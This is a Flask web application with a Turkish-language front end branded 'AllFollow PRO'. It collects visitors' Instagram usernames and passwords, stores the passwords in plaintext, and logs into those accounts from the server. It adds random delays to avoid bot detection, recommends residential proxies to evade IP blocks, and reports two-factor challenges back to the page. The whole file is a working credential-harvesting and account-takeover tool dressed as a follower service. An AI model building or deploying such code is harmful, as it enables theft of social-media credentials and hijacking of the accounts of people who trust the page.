import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# DİKKAT: Render IP'si blokluysa buraya Residential Proxy şart.
PROXY_URL = None 

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekleniyor")

def run_bot(u, p):
    with app.app_context():
        cl = Client()
        # Instagram'ın bot algılamaması için rastgele bekleme
        cl.delay_range = [1, 3]
        
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            if PROXY_URL:
                cl.set_proxy(PROXY_URL)
            
            # LOGIN İŞLEMİ (Maksimum 20 saniye bekleme süresi koyar)
            cl.login(u, p)
            acc.status = "AKTIF"
            db.session.commit()
        except ChallengeRequired:
            acc.status = "KOD_GEREKLI"
            db.session.commit()
        except BadPassword:
            acc.status = "SIFRE_HATALI"
            db.session.commit()
        except Exception as e:
            # Burası IP bloğu yediğimiz yer kanka
            acc.status = "IP_ENGELI"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Giris_Deniyor"
    db.session.commit()
    
    # Thread ile arka plana atıyoruz ki sistem donmasın
    threading.Thread(target=run_bot, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0c0c0e; color: #e4e4e7; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(24, 24, 27, 0.6); border: 1px solid #27272a; backdrop-filter: blur(10px); }
        .page { display: none; } .active { display: block; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
        .animate-pulse-fast { animation: pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div id="p1" class="page active w-full max-w-[360px]">
        <div class="glass p-8 rounded-[2rem] shadow-2xl">
            <h1 class="text-3xl font-bold text-center mb-8 text-white italic tracking-tighter">ALLFOLLOW <span class="text-purple-500">PRO</span></h1>
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl mb-4 outline-none focus:border-purple-500 transition-all">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl mb-6 outline-none focus:border-purple-500 transition-all">
            <button onclick="go()" id="btn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-4 rounded-2xl transition-transform active:scale-95 shadow-lg shadow-purple-500/20">SİSTEME GİRİŞ YAP</button>
        </div>
    </div>

    <div id="p2" class="page w-full max-w-[360px]">
        <div class="glass p-8 rounded-[2rem] text-center">
            <div id="loader" class="mb-6 mx-auto w-12 h-12 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
            <h2 id="msg" class="text-xl font-bold mb-2 animate-pulse-fast">BAĞLANTI KURULUYOR</h2>
            <p id="sub" class="text-zinc-500 text-sm mb-6">Instagram sunucuları yanıt veriyor...</p>
            <div id="details" class="hidden">
                 <button onclick="location.reload()" class="w-full bg-zinc-800 py-3 rounded-xl text-xs font-bold uppercase">TEKRAR DENE</button>
            </div>
        </div>
    </div>

    <script>
        let user = "";
        async function go() {
            user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(!user || !pass) return;

            document.getElementById('p1').classList.remove('active');
            document.getElementById('p2').classList.add('active');

            fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: user, p: pass})
            });

            const check = setInterval(async () => {
                const res = await fetch('/api/status/' + user);
                const data = await res.json();
                const m = document.getElementById('msg');
                const s = document.getElementById('sub');

                if(data.status === "AKTIF") {
                    clearInterval(check);
                    m.innerText = "GİRİŞ BAŞARILI ✅";
                    m.className = "text-xl font-bold mb-2 text-green-500";
                    s.innerText = "Yönlendiriliyorsunuz...";
                    setTimeout(() => alert("Dashboard Hazır!"), 1000);
                } else if(data.status === "KOD_GEREKLI") {
                    clearInterval(check);
                    m.innerText = "KOD GEREKLİ ⚠️";
                    m.className = "text-xl font-bold mb-2 text-yellow-500";
                    s.innerText = "Instagram hesabına bir onay kodu gönderdi.";
                    document.getElementById('loader').style.display = "none";
                    document.getElementById('details').classList.remove('hidden');
                } else if(data.status === "IP_ENGELI") {
                    clearInterval(check);
                    m.innerText = "BAĞLANTI REDDEDİLDİ 🚫";
                    m.className = "text-xl font-bold mb-2 text-red-500";
                    s.innerText = "Instagram bu sunucunun IP adresini engelledi. Proxy kullanmalısın.";
                    document.getElementById('loader').style.display = "none";
                    document.getElementById('details').classList.remove('hidden');
                } else if(data.status === "SIFRE_HATALI") {
                    clearInterval(check);
                    m.innerText = "ŞİFRE HATALI ❌";
                    m.className = "text-xl font-bold mb-2 text-red-500";
                    s.innerText = "Lütfen bilgilerini kontrol et.";
                    document.getElementById('loader').style.display = "none";
                    document.getElementById('details').classList.remove('hidden');
                }
            }, 3000);
        }
    </script>
</body>
</html>
